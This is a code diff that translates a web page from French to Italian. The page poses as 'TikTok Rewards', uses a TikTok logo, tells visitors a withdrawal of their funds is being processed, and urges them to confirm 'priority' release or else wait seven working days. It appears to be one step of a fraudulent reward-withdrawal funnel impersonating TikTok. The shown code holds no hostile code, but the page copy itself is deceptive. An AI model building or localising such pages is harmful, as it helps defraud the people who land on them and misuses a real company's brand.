@@ -5,15 +5,15 @@ import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
 export const Route = createFileRoute("/obrigado2")({
   head: () => ({
     meta: [
-      { title: "Confirmer mon retrait | TikTok Récompenses" },
+      { title: "Conferma il mio prelievo | TikTok Ricompense" },
       {
         name: "description",
-        content: "Souhaitez-vous débloquer votre retrait en priorité dès maintenant ?",
+        content: "Vuoi sbloccare il tuo prelievo in via prioritaria subito?",
       },
-      { property: "og:title", content: "Confirmer mon retrait" },
+      { property: "og:title", content: "Conferma il mio prelievo" },
       {
         property: "og:description",
-        content: "Souhaitez-vous débloquer votre retrait en priorité dès maintenant ?",
+        content: "Vuoi sbloccare il tuo prelievo in via prioritaria subito?",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -43,7 +43,7 @@ function Obrigado2() {
                 <div className="w-2 h-2 rounded-full bg-[#25f4ee]" />
                 <div className="w-2 h-2 rounded-full bg-[#ff3b5c]" />
              </div>
-             <span className="text-white font-bold text-sm tracking-tight">TikTok Récompenses</span>
+             <span className="text-white font-bold text-sm tracking-tight">TikTok Ricompense</span>
           </div>
 
           {/* Progress Ring */}
@@ -53,8 +53,8 @@ function Obrigado2() {
           </div>
 
           {/* Text */}
-          <h2 className="text-white text-[17px] font-bold mb-2">Préparation de l’étape suivante...</h2>
-          <p className="text-neutral-500 text-[13px]">Merci de patienter quelques instants.</p>
+          <h2 className="text-white text-[17px] font-bold mb-2">Preparazione del passaggio successivo...</h2>
+          <p className="text-neutral-500 text-[13px]">Attendi qualche istante.</p>
         </div>
       </main>
     );
@@ -72,24 +72,24 @@ function Obrigado2() {
 
           <div className="w-full bg-[#121212] rounded-[32px] p-10 border border-white/5 shadow-2xl text-center">
             <h1 className="text-white text-[28px] font-black leading-tight mb-6">
-              Souhaitez-vous débloquer votre retrait en <span className="text-[#25f4ee]">priorité</span> dès maintenant ?
+              Vuoi sbloccare il tuo prelievo in <span className="text-[#25f4ee]">priorità</span> subito?
             </h1>
             
             <p className="text-neutral-400 text-[15px] leading-relaxed mb-10">
-              Votre retrait est en cours de traitement. Activez le traitement prioritaire pour recevoir vos fonds en quelques minutes.
+              Il tuo prelievo è in fase di elaborazione. Attiva l'elaborazione prioritaria per ricevere i tuoi fondi in pochi minuti.
             </p>
 
             <button
               onClick={() => navigate({ to: "/obrigado3" })}
               className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_15px_35px_rgba(255,59,92,0.25)] transition-all hover:scale-[1.02] active:scale-[0.98]"
             >
-              OUI, JE CONFIRME
+              SÌ, CONFERMO
             </button>
           </div>
 
           {/* Back link */}
           <button className="mt-8 text-neutral-500 text-sm font-medium hover:text-neutral-300 transition-colors">
-            Non, j’attends les 7 jours ouvrés
+            No, aspetto i 7 giorni lavorativi
           </button>
        </div>
     </main>
